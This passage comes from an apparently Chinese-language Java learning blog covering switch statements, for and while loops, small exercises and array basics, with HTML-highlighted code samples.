class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入今天是星期几：&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (today)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期一&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;reganmian&quot;</span>);<br>                <span class="hljs-comment">//break;</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期二&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;lanzhoulamian&quot;</span>);<br>                <span class="hljs-comment">//break;</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期三&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;zhajiangmian&quot;</span>);<br>                <span class="hljs-comment">//break;</span><br>            <span class="hljs-keyword">default</span>:<br>                System.out.println(<span class="hljs-string">&quot;fangbianmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn23.png" alt="javalearn23"></p><h4 id="switch的新特性"><a href="#switch的新特性" class="headerlink" title="switch的新特性"></a>switch的新特性</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入今天是星期几：&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (today)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期一&quot;</span> -&gt; &#123;<br>                System.out.println(<span class="hljs-string">&quot;今天是星期一&quot;</span>);<span class="hljs-comment">//去掉大括号直接合并成一行也行</span><br>            &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期二&quot;</span> -&gt; &#123;<br>                System.out.println(<span class="hljs-string">&quot;今天是星期二&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期三&quot;</span> -&gt; &#123;<br><br>                System.out.println(<span class="hljs-string">&quot;今天是星期三&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">default</span> -&gt; &#123;<br>                System.out.println(<span class="hljs-string">&quot;haha &quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="swicth与if的区别"><a href="#swicth与if的区别" class="headerlink" title="swicth与if的区别"></a>swicth与if的区别</h4><ul><li>switch更多的去一一列举有限个数据</li><li>if更多的去进行范围判断</li></ul><h4 id="case穿透例题："><a href="#case穿透例题：" class="headerlink" title="case穿透例题："></a>case穿透例题：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入今天是星期几：&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (today)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期一&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期二&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期三&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期四&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期五&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;工作日&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期六&quot;</span>:<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期日&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;休息日&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当然也可以进一步简化(我的版本有点低就只放图了)：</p><p><img src="/img/JAVAlearn31.png" alt="JAVAlearn31"></p><h4 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h4><ul><li>for</li><li>while</li><li>do…while</li></ul><p>for:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;you should know me&quot;</span>);<br>        &#125;<br><br><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>练习：求1-100中所有偶数之和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//求1到100的偶数和</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">100</span>; i++)&#123;<br><br>            <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> ==<span class="hljs-number">0</span>)&#123;<br><br>                sum = sum +i;<br><br>            &#125;<br>        &#125;<br>        System.out.println(sum);<br><br>        &#125;<br>    &#125;<br><span class="hljs-comment">//2550</span><br></code></pre></td></tr></table></figure><p>练习：键盘录入两个数字，表示一个范围。统计这个范围中既能被三整除又能被五整除的数字有对多少个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//求1到100的偶数和</span><br><br>        <span class="hljs-type">int</span> i;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入范围较小的数字Num1：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;请输入范围较大的数字Num2：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">for</span> (i = num1; i &lt;= num2; i++)&#123;<br>            <span class="hljs-keyword">if</span> (i % <span class="hljs-number">3</span> ==<span class="hljs-number">0</span> &amp;&amp; i % <span class="hljs-number">5</span> ==<span class="hljs-number">0</span>)&#123;<br>                sum = sum +<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;在&quot;</span> + num1 + <span class="hljs-string">&quot;到&quot;</span> + num2 + <span class="hljs-string">&quot;这个范围中，能同时被3和5整除的数字的数量为：&quot;</span>+sum);<br><br><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>while:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//打印1到100</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &lt;= <span class="hljs-number">100</span>) &#123;<br>            System.out.println(i);<br>            i++;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>for和while的对比：</p><p><img src="/img/javalearn24.png" alt="javalearn24"></p><p>比如对于这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &lt;= <span class="hljs-number">10</span>) &#123;<br>            System.out.println(i);<br>            i++;<br><br>        &#125;<br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后输出的数据会是<code>11</code></p><p>当然可以对<code>for</code>进行如下改写(i提到外面)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> ( ; i &lt;= <span class="hljs-number">10</span>;i++) &#123;<br>            System.out.println(i);<br>            <br><br>        &#125;<br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn25.png" alt="javalearn25"></p><p>练习：如果想把<code>0.1mm</code>的纸折叠成<code>8844430mm</code>，求折叠的次数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//把`0.1mm`的纸折叠成`8844430mm`，求折叠的次数</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">double</span> <span class="hljs-variable">hight</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.1</span>;<br><br><br>        <span class="hljs-keyword">while</span> (hight &lt;= <span class="hljs-number">8844430</span>)&#123;<br><br>            hight = hight * <span class="hljs-number">2</span>;<br><br>            i = i +<span class="hljs-number">1</span>;<br>        &#125;<br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断回文数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">```<br><br><br><br>P48<br><br>P54:<br><br>### 数组<br><br>&gt; 数组指的是一种容器，可以用来存储同种数据类型的多个值<br><br>![javalearn26](img/javalearn26.png)<br><br><br><br>数组的定义<br><br>![javalearn27](img/javalearn27.png)<br><br>数组初始化方式：<br><br>- 静态初始化：<br><br>![javaleearn29](img/javaleearn29.png)<br><br>比如：<br><br>```java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>        String [] theirname = &#123;<span class="hljs-string">&quot;tom&quot;</span>, <span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-string">&quot;bob&quot;</span>, <span class="hljs-string">&quot;chris&quot;</span>&#125;;<br>        <span class="hljs-type">double</span> [] theirhight = &#123;<span class="hljs-number">111.1</span>, <span class="hljs-number">222.2</span>, <span class="hljs-number">333.3</span>, <span class="hljs-number">444.4</span>&#125;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如何将数组中的数据取出？如果直接<code>sout</code>数组名，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>    System.out.println(theirage);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>会出现：</p><p><img src="/img/javalearn32.png" alt="javalearn32"></p><p><img src="/img/javalearn33.png" alt="javalearn33"></p><p><img src="/img/javalearn34.png" alt="javalearn34"></p><p>数组元素访问</p><ul><li>格式：数组名[索引]</li></ul><p>索引：</p><ul><li>也叫下标、角标。</li><li>特点：从0开始，逐个+1增长，连续不间断。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">array1</span> <span class="hljs-operator">=</span> theirage[<span class="hljs-number">0</span>];<br><br>        System.out.println(array1);<br><br>        System.out.println(theirage[<span class="hljs-number">0</span>]);<br><br>        theirage[<span class="hljs-number">0</span>] = <span class="hljs-number">100</span>;<br><br>        System.out.println(theirage[<span class="hljs-number">0</span>]);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>数组遍历</p><ul><li>将数组中所有的内容取出来，可以对其进行一系列操作：打印，求和，判断等</li><li>遍历指的是取出数据的过程，不要局限的理解为遍历就是打印</li></ul><p>跟<code>python</code>差不多，还是用<code>for</code>循环进行遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> i;<br><br>        <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; arraylength; i++)&#123;<br><br>            System.out.println(theirage[i]);<br><br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当然<code>idea</code>也提供了快速生成数组的方式，直接<code>数组名.fori</code>就会自动生成<code>for (i=0; i &lt; arraylength; i++)</code>这东西</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//练习：遍历数组并求和</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>            sum = sum + theirage[i1];<br><br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;数组元素之和为：&quot;</span> + sum);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//练习：统计个数</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>            sum = sum + 